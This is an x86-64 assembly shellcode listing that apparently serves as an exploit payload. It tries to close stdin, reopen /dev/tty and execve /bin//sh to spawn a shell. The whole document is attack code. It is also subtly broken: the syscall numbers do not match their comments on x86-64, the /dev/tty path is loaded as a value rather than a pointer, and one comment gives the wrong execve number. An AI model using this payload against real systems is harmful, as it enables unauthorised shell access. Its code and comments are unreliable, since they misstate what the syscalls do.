section .text
global _start
_start:
	;; close stdin
	xor rax, rax
	xor rdi, rdi
	mov al, 4			; syscall close
	syscall
	
	;; open a new tty
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	mov al, 3 			; syscal open
	mov rdi, 0x7974742f7665642f 	; ytt/ved/ -> /dev/tty
	mov si, 0x2702		    	; O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC
	syscall

	xor esi, esi
	mov rbx, 0x68732f2f6e69622f 	; hs//nib/ = /bin//sh
	push rsi		    	;'\0' = /bin//sh'\0'
	push rbx		    	;
	push rsp		    	;
	pop rdi			    	; rdi -> rbx = /bin//sh
	push 59			    	;
	pop rax			    	; syscall 56 -> __NR_execve
	xor edx, edx		    	; NULL
	syscall
